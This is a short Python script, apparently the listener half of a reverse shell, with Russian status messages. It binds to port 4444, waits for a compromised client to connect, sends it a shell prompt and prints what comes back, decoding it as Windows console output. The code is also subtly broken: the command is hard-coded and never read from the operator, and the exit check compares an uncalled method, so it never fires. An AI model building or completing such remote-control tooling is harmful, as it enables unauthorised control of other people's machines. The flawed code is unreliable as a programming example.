import sys 
import socket
import os
#--Soket--
HOST = '192.168.1.67'
PORT = 4444

server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
server_socket.bind((HOST,PORT))
server_socket.listen(5)
print(f"[*]Cлушается ip {HOST} and Port {PORT}")
print(f'[*] Ожидаеться подключение')
client_socket,client_addres = server_socket.accept()
print("[*] Подключение клиента...")
print(f"[*] Клиент подключился {client_addres}")
#----
while True:
    command = 'shell> '
    if command.lower == 'exit':
        client_socket.send(b"exit")
        break
    client_socket.send(command.encode())
    responce = client_socket.recv(4096).decode('cp866',errors='ignore')
    print(responce)
server_socket.close()
client_socket.close()